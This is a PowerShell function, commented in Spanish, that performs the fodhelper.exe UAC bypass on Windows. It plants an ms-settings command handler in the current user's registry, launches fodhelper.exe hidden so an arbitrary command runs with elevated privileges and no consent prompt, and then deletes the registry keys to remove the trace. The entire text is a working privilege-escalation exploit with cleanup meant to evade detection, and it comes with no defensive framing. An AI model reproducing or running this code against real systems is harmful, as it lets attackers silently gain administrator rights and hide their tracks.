function FodhelperBypass {
    Param (
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe"
    )

    # 1. Crea la estructura de registro
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force

    # 2. Crea DelegateExecute (vacío, solo debe existir)
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
        -Name "DelegateExecute" -Value "" -Force

    # 3. Define el comando a ejecutar con privilegios elevados
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" `
        -Name "(default)" -Value $program -Force

    # 4. Lanza fodhelper.exe (auto-eleva sin prompt)
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

    # 5. Limpia el rastro en registro
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}   
```
